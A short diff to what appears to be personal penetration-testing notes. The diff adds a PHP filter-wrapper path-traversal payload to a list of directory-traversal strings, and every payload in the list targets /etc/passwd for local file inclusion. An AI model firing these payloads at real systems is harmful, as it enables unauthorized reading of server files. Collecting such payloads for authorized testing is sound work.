@@ -645,7 +645,7 @@ Found an admin dashboard in Shodan.
   Path traversal to LFI 
 
 Directory Traversal 
-
+query=php://filter/resource=../../../../../../../../../etc/passwd
 ../../../../../../../../../etc/passwd => can url encode the ../../
 ../../../../etc/passwd
  /root/etc/passwd 
